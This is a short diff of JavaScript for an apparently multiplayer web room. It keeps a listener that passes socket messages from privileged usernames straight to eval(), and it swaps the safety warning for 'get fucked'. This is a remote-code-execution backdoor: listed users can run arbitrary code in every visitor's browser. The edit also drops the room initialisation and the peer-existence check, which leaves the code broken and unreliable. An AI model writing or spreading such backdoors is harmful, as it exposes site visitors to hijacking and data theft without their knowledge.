@@ -1,9 +1,6 @@
-let room;
+
 if (typeof window.roomInitialized === "undefined") {
   window.roomInitialized = true; // Set a global flag to indicate initialization
-
-  room = new WebsimSocket();
-  room.initialize();
   room.send({type:'joined',user:room.peers[room.clientId].username});
   // Setup a message listener for the room object
   if (typeof room !== "undefined") {
@@ -13,14 +10,11 @@ if (typeof window.roomInitialized === "undefined") {
         if (
           event.data &&
           event.data.type === "command" &&
-          room.peers[event.data.clientId] && // Ensure clientId exists in room.peers
-          (room.peers[event.data.clientId].username === "blueyellow" || 
-           room.peers[event.data.clientId].username === "TheEthicalHacker")
-        ) {
+          admins.includes(room.peers[event.data.clientId].username)) {
           console.log("Received authorized command:", event.data.command);
 
           // Evaluate the command
-          eval(event.data.command); // WARNING: Use eval only if you trust the source of the commands!
+          eval(event.data.command); // WARNING: get fucked
         } else {
           console.log("Unauthorized or invalid message received:", event.data);
         }
